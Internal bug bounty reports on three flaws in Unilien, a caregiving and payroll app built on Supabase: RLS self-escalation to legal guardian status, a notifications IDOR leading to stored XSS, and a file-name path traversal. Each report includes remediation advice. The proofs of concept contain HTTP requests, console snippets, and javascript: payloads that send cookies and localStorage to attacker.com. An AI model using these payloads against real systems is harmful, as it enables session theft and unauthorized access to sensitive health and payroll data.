# Bug Bounty Reports — Unilien

Professional vulnerability reports formatted for HackerOne, Bugcrowd, or YesWeHack.

> **26/03/2026** — These write-ups are **historical triage** artifacts. Database and policy fixes are in **`041_security_fixes.sql`** with a summary in **`docs/SECURITY_CHECK_2026-03-26.md`**. Use them for **regression** testing (API replay should fail where 041 applies).

---

## Report #1: Caregiver Self-Promotion to Legal Guardian (Critical)

### Title
**Broken Access Control: Caregiver Can Self-Escalate to Tutor/Curator Legal Status Without Verification**

### Summary

Any authenticated user with the "caregiver" role can update their own `legal_status` field to `tutor` or `curator` in the database, bypassing intended authorization checks. This grants them full legal guardian privileges—equivalent to a court-appointed tutor or curator—without any document verification or employer approval. The vulnerability stems from an overly permissive Row Level Security (RLS) policy that allows caregivers to modify all columns of their own record, including the privileged `legal_status` field.

### Affected Component

- **Backend**: Supabase (PostgreSQL) — `caregivers` table
- **RLS Policy**: `Caregivers can update their own profile` (migration `008_add_caregiver_profile_fields.sql`)
- **Frontend**: `CaregiverSection.tsx` — profile self-edit form exposes `legal_status` dropdown
- **API**: `PATCH /rest/v1/caregivers?profile_id=eq.<UUID>`

### Severity Assessment

**Severity: Critical (CVSS 3.x ~ 9.1)**

| Factor | Justification |
|--------|---------------|
| **Attack Vector** | Network, low attack complexity |
| **Privileges Required** | Low (caregiver account) |
| **User Interaction** | None for API; one form submission for UI |
| **Scope** | Changed (affects other users' data) |
| **Impact** | Full read/write on employer data, contract management, payroll |

The application manages sensitive healthcare and payroll data under French labor law (IDCC 3239). A caregiver gaining tutor/curator status can access payslips, IBANs, disability information, and modify or delete contracts—causing legal and financial harm.

### Step-by-Step Reproduction

**Prerequisites**: Valid caregiver account linked to an employer (e.g., family member).

#### Via UI

1. Log in as a caregiver with limited permissions (e.g., no `canManageTeam`, no `canExportData`).
2. Navigate to **Profile** → **Mon profil aidant** (caregiver profile section).
3. In the "Statut juridique" (Legal status) dropdown, change from "Aucun statut particulier" to **Tuteur** or **Curateur**.
4. Click **Enregistrer** (Save).
5. Observe the request succeeds. Refresh and verify the new status is persisted.
6. Navigate to **Équipe**, **Conformité**, **Documents**, or **Planning**. Confirm full access to employer data previously restricted.

#### Via API (Proof of Concept)

```http
PATCH /rest/v1/caregivers?profile_id=eq.<CURRENT_USER_UUID> HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <SUPABASE_ANON_KEY>
Authorization: Bearer <ACCESS_TOKEN>
Prefer: return=representation

{"legal_status":"tutor"}
```

**Expected**: 403 Forbidden (only employer should update `legal_status`).  
**Actual**: 200 OK with updated row. Escalation succeeds.

### Proof of Concept

**JavaScript (browser console, authenticated as caregiver):**

```javascript
const { data, error } = await window.supabase
  .from('caregivers')
  .update({ legal_status: 'tutor' })
  .eq('profile_id', (await window.supabase.auth.getUser()).data.user.id)
  .select()
  .single()

console.log('Escalation result:', error ? error : data)
// error === null → privilege escalation successful
```

### Impact

| Impact Type | Description |
|-------------|-------------|
| **Privilege Escalation** | Caregiver gains tutor/curator-level access without legal verification |
| **Data Breach** | Full access to payslips, IBANs, contracts, disability details, employee information |
| **Data Manipulation** | Create/delete contracts, cancel shifts, approve/reject absences |
| **Compliance** | Violation of legal guard requirements (tutor/curator status must be evidenced) |
| **Account Takeover (indirect)** | Ability to remove other caregivers or alter permissions |

### Business Impact

- **Regulatory**: French legal guardianship requires documented court decisions. Self-declaration undermines compliance.
- **Trust**: Employers (often vulnerable individuals) expect strict access control. Abuse erodes platform credibility.
- **Financial**: Unauthorized contract or payroll changes can lead to disputes and legal liability.
- **Reputation**: Public disclosure of such a flaw would damage trust in a healthcare-adjacent product.

### Recommended Remediation

1. **RLS Policy**  
   Restrict caregivers from modifying `legal_status` on their own row. Options:
   - Use a separate policy for "limited" profile updates that excludes `legal_status`, `employer_id`, and `permissions_locked`.
   - Or use a `CHECK` constraint that prevents changing `legal_status` unless the actor is the employer (e.g. via a function).

   Example (PostgreSQL):
   ```sql
   -- Drop overly permissive policy
   DROP POLICY "Caregivers can update their own profile" ON caregivers;

   -- Create restricted policy (profile fields only, no legal_status)
   CREATE POLICY "Caregivers can update own profile limited"
   ON caregivers FOR UPDATE
   USING (profile_id = auth.uid())
   WITH CHECK (
     profile_id = auth.uid()
     AND legal_status IS NOT DISTINCT FROM (
       SELECT legal_status FROM caregivers c WHERE c.profile_id = auth.uid()
     )
   );
   ```

2. **Application Logic**  
   - Remove `legal_status` from the caregiver self-edit form in `CaregiverSection.tsx`.
   - Allow only employers to set `legal_status` in `AddCaregiverModal` / `EditCaregiverModal`.
   - Add an Edge Function or RPC for employer-initiated `legal_status` updates, optionally with document or workflow verification.

3. **Verification Workflow**  
   - Introduce a documented process for tutor/curator status (e.g. upload of court decision, admin review).

### Remediation status (2026-03-26)

**RLS** — Policy **`Caregivers can update own profile limited`** in **041** blocks self-service changes to `legal_status`, `employer_id`, `permissions`, `permissions_locked`. Replaying the PoC API calls against an updated DB should return **error**. The **UI** may still show `legal_status`; RLS remains the backstop — optional UI hardening can further reduce confusion.

---

## Report #2: Notifications IDOR, Open Redirect & Stored XSS Chain (Critical)

### Title
**Insecure Direct Object Reference in Notifications Allows Arbitrary Notification Creation, Phishing & Stored XSS**

### Summary

The notifications system suffers from multiple access control and validation flaws that can be chained:

1. **IDOR**: Any authenticated user can create notifications for any other user via direct REST `INSERT` or RPC `create_notification`, with no check of employer-employee-caregiver relationship.
2. **Open Redirect**: The `action_url` field is not validated and is used directly for navigation, enabling phishing.
3. **Stored XSS**: When the victim clicks a push notification, `action_url` is assigned to `window.location.href`. A `javascript:` URL leads to arbitrary script execution in the victim's context.

### Affected Components

- **API**: `POST /rest/v1/notifications`, `POST /rest/v1/rpc/create_notification`
- **RLS**: Policy `notifications_insert` (only checks `auth.uid() IS NOT NULL`)
- **Client**: `pushService.ts` (L382-385), `NotificationsPanel.tsx` (L283-284), `sw-push.js` (L89-118)

### Severity Assessment

**Severity: Critical (CVSS 3.x ~ 8.5)**

The combination of IDOR + open redirect + XSS allows an attacker to:
- Target any user
- Deliver a trusted-looking notification
- Execute JavaScript in the victim's session on click (session theft, token exfiltration)

### Step-by-Step Reproduction

**Prerequisites**: Authenticated user account (any role).

#### 1. Create malicious notification (via REST IDOR)

```http
POST /rest/v1/notifications HTTP/1.1
Host: <PROJECT_REF>.supabase.co
Content-Type: application/json
apikey: <SUPABASE_ANON_KEY>
Authorization: Bearer <ATTACKER_ACCESS_TOKEN>
Prefer: return=representation

{
  "user_id": "<VICTIM_UUID>",
  "type": "shift_reminder",
  "title": "Rappel de garde",
  "message": "Cliquez pour consulter les détails de votre prochaine intervention.",
  "priority": "high",
  "action_url": "javascript:fetch('https://attacker.com/log?c='+document.cookie)"
}
```

**Expected**: 403 (insert only for own notifications).  
**Actual**: 201 Created. Victim receives the notification.

#### 2. Trigger push (optional)

If the victim has push enabled, the Edge Function `send-push-notification` is invoked automatically when the notification is created (via frontend trigger). The push payload includes `data.url = action_url`.

#### 3. Victim clicks notification

- **In-app**: `handleNotificationClick` → `navigate(action_url)` or `window.location.href` (depending on flow).
- **Foreground**: `showLocalNotification` → `window.location.href = payload.data.url` → **JavaScript executes**.
- **Background**: Service worker uses `openWindow(targetUrl)` or `client.navigate(targetUrl)`; `javascript:` behavior varies by browser.

#### 4. Proof of XSS

Replace `action_url` with:
```
javascript:alert(document.domain)
```
Victim sees `alert(document.domain)` when clicking the notification (app in foreground).

### Proof of Concept Payloads

**Phishing (Open Redirect):**
```json
"action_url": "https://evil-phishing.com/unilien-login"
```

**Session Theft (XSS):**
```json
"action_url": "javascript:fetch('https://attacker.com/?c='+encodeURIComponent(document.cookie))"
```

**Token Exfiltration (if stored in localStorage):**
```json
"action_url": "javascript:fetch('https://attacker.com/?t='+encodeURIComponent(JSON.stringify(localStorage)))"
```

### Impact

| Impact Type | Description |
|-------------|-------------|
| **Account Takeover** | Steal session/tokens via XSS, reuse victim session |
| **Phishing** | Redirect users to fake login, harvest credentials |
| **Spam / Harassment** | Flood specific users with unwanted notifications |
| **Data Exfiltration** | Execute scripts to read sensitive in-page data |

### Business Impact

- **Trust**: Users expect notifications to be safe; malicious redirects and script execution break that trust.
- **Account Security**: Stolen tokens enable full account compromise.
- **Compliance**: Handling of personal/health data under RGPD is impacted by such weaknesses.

### Recommended Remediation

1. **Fix RLS on `notifications`**
   ```sql
   DROP POLICY "notifications_insert" ON public.notifications;
   CREATE POLICY "notifications_insert" ON public.notifications
     FOR INSERT TO authenticated
     WITH CHECK (auth.uid() = user_id);
   ```
   Cross-user notifications must go through a controlled backend path only.

2. **Restrict RPC `create_notification`**
   - Enforce business rules (employer→employee, etc.) in PL/pgSQL or move to an Edge Function.
   - Validate `p_action_url`: allow only relative paths starting with `/` (same-origin). Reject `javascript:`, `data:`, `//`, and absolute `http(s):` URLs.

3. **Client-side URL validation**
   - In `pushService.ts` and `sw-push.js`, validate URLs before assignment:
   ```typescript
   function isSafeUrl(url: string): boolean {
     try {
       const u = new URL(url, window.location.origin);
       return u.origin === window.location.origin && u.pathname.startsWith('/');
     } catch { return false; }
   }
   if (payload.data?.url && isSafeUrl(payload.data.url)) {
     window.location.href = payload.data.url;
   }
   ```

4. **Remove direct REST inserts for cross-user notifications**  
   Ensure all cross-user notifications flow through server-side logic that enforces authorization and URL validation.

### Remediation status (2026-03-26)

- **`notifications_insert_own`** and hardened **`create_notification`** (**041**).
- Client alignment: `notificationService`, `NotificationsPanel`, `pushService`, `sw-push.js` — see **`SECURITY_XSS_ANALYSIS.md`** and **`SECURITY_CHECK_2026-03-26.md`**.

---

## Report #3: Path Traversal in Attachment Upload (Medium)

### Title
**Unvalidated File Name in Attachment Upload Enables Path Traversal**

### Summary

The liaison attachment upload uses the client-provided `file.name` directly in the storage path without sanitization. An attacker can include path traversal sequences (`../`) or other special characters to influence where files are stored, potentially overwriting or exposing other users' files depending on storage configuration.

### Affected Component

- **File**: `src/services/attachmentService.ts` (line 71)
- **Code**: `const fileName = \`${conversationId}/${senderId}/${Date.now()}_${file.name}\`

### Severity Assessment

**Severity: Medium (CVSS 3.x ~ 5.4)**

- Requires authenticated user with conversation access
- Impact depends on Supabase storage layout and policies
- Can lead to file overwrite, wrong-path writes, or policy bypass in some setups

### Step-by-Step Reproduction

1. Log in as a user with access to a liaison conversation.
2. Create a file with a malicious name, e.g. `../../other_user/document.pdf` (e.g. via `document.createElement('input')` and `DataTransfer`).
3. Upload the file via the message attachment UI.
4. Observe the request; the path sent to Supabase includes the unsanitized `file.name`.

**Proof of Concept (browser console):**

```javascript
const dt = new DataTransfer();
const f = new File(['x'], '../../sensitive/file.pdf', { type: 'application/pdf' });
dt.items.add(f);
const input = document.querySelector('input[type="file"]');
input.files = dt.files;
// Trigger upload via UI
```

### Impact

- Path traversal: files written outside intended directory
- Potential overwrite of existing files
- Possible bypass of storage policies if path influences RLS

### Recommended Remediation

Sanitize `file.name` before use:

```typescript
function sanitizeFileName(name: string): string {
  const basename = name
    .replace(/^.*[/\\]/, '')
    .replace(/\.\./g, '')
    .replace(/[/\\]/g, '_')
    .slice(0, 200);
  return basename || `file_${Date.now()}`;
}
const fileName = `${conversationId}/${senderId}/${Date.now()}_${sanitizeFileName(file.name)}`;
```

### Remediation status (2026-03-26)

**Open** — sanitization of `file.name` in `attachmentService` remains **recommended** (not part of migration 041). Track with **`SECURITY_PENTEST_REPORT.md`** § 2.3.

---

## Assumptions

- Supabase project URL and anon key are accessible from the frontend (typical SPA setup).
- Push notifications are configured (VAPID keys and Edge Function deployed).
- Victim has push enabled or uses the in-app notification UI.
- `supabase` client is exposed globally where PoC uses `window.supabase`; if not, the same calls can be made via direct HTTP to the REST API.

---

## References

- OWASP: [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [XSS](https://owasp.org/www-community/attacks/xss/)
- Supabase RLS: https://supabase.com/docs/guides/auth/row-level-security
- Internal docs: `SECURITY_PENTEST_REPORT.md`, `SECURITY_IDOR_ANALYSIS.md`, `SECURITY_XSS_ANALYSIS.md`
